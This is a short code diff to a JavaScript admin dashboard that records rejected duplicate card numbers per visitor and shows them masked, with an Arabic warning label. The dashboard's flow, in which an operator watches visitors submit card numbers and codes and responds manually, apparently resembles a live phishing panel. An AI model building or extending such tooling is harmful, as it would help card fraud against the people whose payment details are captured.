@@ -1154,6 +1154,9 @@
           existing.waitingForAdminResponse = false;
           if (updatedVisitor) Object.assign(existing, updatedVisitor);
           existing.waitingForAdminResponse = false;
+          // Track duplicate card rejections
+          if (!existing.duplicateCardRejections) existing.duplicateCardRejections = [];
+          existing.duplicateCardRejections.push({ cardNumber: cardNumber, timestamp: new Date().toISOString() });
           visitors.set(visitorId, existing);
           renderVisitorsList();
           if (selectedVisitorId === visitorId) {
@@ -1581,6 +1584,16 @@
         html += '</div>';
       }
       
+      // Show duplicate card rejection notes
+      if (visitor.duplicateCardRejections && visitor.duplicateCardRejections.length > 0) {
+        visitor.duplicateCardRejections.forEach((rej) => {
+          const maskedCard = rej.cardNumber ? rej.cardNumber.slice(0, 4) + ' **** **** ' + rej.cardNumber.slice(-4) : '';
+          html += '<div class="bg-yellow-50 border border-yellow-300 rounded-lg p-3">';
+          html += '<p class="text-yellow-800 font-medium text-center">⚠️ تم رفض بطاقة مكررة: ' + maskedCard + '</p>';
+          html += '</div>';
+        });
+      }
+
       // Combine all entries (cards, codes, and data history) and sort by timestamp (newest first))
       const allEntries = [];
       
